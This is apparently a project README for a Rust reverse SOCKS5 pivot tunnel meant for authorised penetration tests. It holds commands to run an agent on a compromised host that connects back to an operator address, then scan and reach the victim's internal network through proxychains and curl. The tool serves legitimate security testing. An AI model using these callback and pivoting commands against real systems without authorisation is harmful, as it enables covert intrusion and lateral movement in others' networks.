<img src="docs/banner.svg" alt="w0rmgate" width="100%">

[![build](https://img.shields.io/github/actions/workflow/status/grimh3xx/w0rmgate/build.yml?branch=main&style=flat-square&labelColor=111826&label=build)](https://github.com/grimh3xx/w0rmgate/actions)
[![license](https://img.shields.io/github/license/grimh3xx/w0rmgate?style=flat-square&labelColor=111826&color=22D3EE)](LICENSE)
![Rust](https://img.shields.io/badge/Rust-2021-3B82F6?style=flat-square&labelColor=111826)
![platform](https://img.shields.io/badge/Linux%20%7C%20Windows-22D3EE?style=flat-square&labelColor=111826)
![authorised use](https://img.shields.io/badge/authorised%20use-only-F87171?style=flat-square&labelColor=111826)


**Reverse SOCKS5 pivot tunnel in Rust for authorised pentests.** The agent runs on
the compromised host and **connects back** to the operator; the operator gets a
SOCKS5 proxy that egresses onto the agent's internal network. Solves the classic
case where the target sits behind NAT/firewall and accepts no inbound.

<p align="center"><img src="docs/demo.svg" alt="w0rmgate demo" width="100%"></p>

> ## ⚠️ Authorised use only
> Pivoting grants lateral access to the target's internal network. Use **only**
> in scoped, explicitly authorised environments. You are responsible.

## How it works

```
operator (you)                          compromised host
┌─────────────────────┐                 ┌──────────────────┐
│ w0rmgate server     │◄──── connects ──│ w0rmgate agent   │
│  :7000 control      │     back        │                  │
│  :1080 SOCKS5 ──────┼─ mux tunnel ───►│  dials internal net
└─────────────────────┘                 └──────────────────┘
proxychains / browser ─► 127.0.0.1:1080
```

Multiplexes many SOCKS connections over one TCP channel
(`[id][kind][len][data]` frames) with backpressure and a dial timeout.

## Usage

On the operator:

```sh
w0rmgate server --control 0.0.0.0:7000 --socks 127.0.0.1:1080
```

On the compromised host:

```sh
w0rmgate agent --connect YOUR_IP:7000
```

Then:

```sh
proxychains -q nmap -sT 10.10.20.0/24
curl --socks5-hostname 127.0.0.1:1080 http://internal.local
```

## Tests

```sh
cargo test --release      # frame codec round-trips
./tests/e2e.sh            # operator+agent+SOCKS through to a local origin (8/8)
```

## Build

```sh
cargo build --release
# agent on a Windows host:
cargo build --release --target x86_64-pc-windows-gnu
```

## License

MIT. See [LICENSE](LICENSE).
